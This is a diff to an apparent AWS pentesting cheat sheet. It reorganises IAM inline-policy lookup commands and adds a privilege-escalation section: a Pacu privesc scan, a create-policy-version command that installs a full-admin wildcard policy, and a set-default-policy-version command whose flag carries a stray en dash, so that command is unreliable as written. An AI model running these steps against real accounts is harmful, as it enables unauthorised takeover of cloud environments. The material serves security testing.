@@ -120,14 +120,42 @@ aws iam list-policy-versions --policy-arn <policy-arn>
 aws iam get-policy-version --policy-arn <policy-arn> --version-id <version-id>
 ```
 
-### Retrieving the specified inline policy document that is embedded on the specified IAM user / group / role 
+### Retrieving the specified inline policy document that is embedded on the specified IAM user
 
 ```
-aws iam get-user-policy --user-name <user-name> --policy-name policy-name
+aws iam get-user-policy --user-name <user-name> --policy-name <policy-name>
+```
 
-aws iam get-group-policy --group-name <group-name> --policy-name policy-name
+### Retrieving the specified inline policy document that is embedded on the specified group
 
-aws iam get-role-policy --role-name  <role-name> --policy-name policy-name
+```
+aws iam get-group-policy --group-name <group-name> --policy-name <policy-name>
+```
+
+### Retrieving the specified inline policy document that is embedded on the specified role 
+
+```
+aws iam get-role-policy --role-name  <role-name> --policy-name <policy-name>
+```
+
+## Privesc with IAM overly permissive right
+
+### PACU - Scan for IAM Privesc
+
+```
+run iam__privesc_scan
+```
+
+### Abuse iam:CreatePolicyVersion permission
+
+```
+aws iam create-policy-version --policy-arn <policy-arn> --policy-document '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'
+```
+
+### Abuse iam:SetDefaultPolicyVersion
+
+```
+aws iam set-default-policy-version --policy-arn <policy-arn> –version-id <vX>
 ```
 
 ## Bucket S3
